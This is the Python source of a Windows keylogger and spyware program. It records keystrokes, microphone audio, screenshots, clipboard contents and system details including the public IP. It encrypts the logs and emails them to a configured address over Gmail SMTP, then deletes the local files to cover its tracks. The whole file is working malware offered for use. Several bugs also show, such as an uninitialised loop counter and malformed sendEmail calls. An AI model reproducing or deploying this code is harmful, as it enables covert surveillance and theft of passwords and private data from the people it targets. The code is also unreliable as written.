# Libraries needed for various functionalities
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# File names for storing collected information
keys_information = "key_log.txt"
system_information = "syseminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

# Encrypted file names
keys_information_e = "e_key_log.txt"
system_information_e = "e_syseminfo.txt"
clipboard_information_e = "e_clipboard.txt"

# Time intervals for various activities
microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3

# Username of the current user
username = getpass.getuser()

# File path for storing logs
file_path = "C:\\use your own path"
extend = "\\"
file_merge = file_path + extend

# Email credentials
email_address = "your email"
password = "password"
to_address = "toWhoYourSending"

# Encryption key
key = "HostvVazWM_OpySAQt4WR_LFSacb1gv6wPaINyZdA8s="

# Function to send email with attachments
def sendEmail(filename, attachment, toaddr):
    fromaddr = email_address
    newMsg = MIMEMultipart()
    newMsg["From"] = fromaddr
    newMsg["To"] = toaddr
    newMsg["Subject"] = "Log FIle"
    body = "Body_of_the_email"
    newMsg.attach(MIMEText(body, "plain"))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase("application", "octet-stream")
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header("Content-Disposition", "attachment; filename= @s" & filename)
    newMsg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = newMsg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

# Function to collect system information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddress = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")
        except Exception:
            f.write("Couldn't get the Public IP Address (most likely max query)")
        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname:" + hostname + "\n")
        f.write("IP Address: " + IPAddress + "\n")

# Function to copy clipboard content
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data: \n" + pasted_data)
        except:
            f.write("Clipboard could not be copied" + "\n")

# Function to record audio
def microphone():
    fs = 44100
    seconds = microphone_time
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2),
    sd.wait()
    write(file_path + extend + audio_information, fs, myrecording)

# Function to capture screenshot
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

# Capture initial time for iterations
currentTime = time.time()
stoppingTime = time.time() + time_iteration

# Loop for collecting keystrokes and performing other activities
while number_of_iterations < number_of_iterations_end:
    count = 0
    keys = []

    def on_press(key):
        global keys, count, currentTime
        print("Key:", key)
        keys.append(key)
        count +=1
        currentTime = time.time()
        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write("\n")
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if(currentTime > stoppingTime):
        with open(file_path + extend + keys_information, 'w') as f:
            f.write(" ")
        screenshot()
        sendEmail(screenshot_information, file_path + extend + screenshot_information + to_address)
        copy_clipboard()
        number_of_iterations += 1
        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

# List of files to be encrypted
files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]

# Encrypt and send files
count = 0
for encrypting_file in files_to_encrypt:
    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()
    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)
    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)
    sendEmail(encrypted_file_names[count], encrypted_file_names[count], to_address)
    count += 1

time.sleep(120)

# Clean up files
delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
for file in delete_files:
    os.remove(file_merge + file)
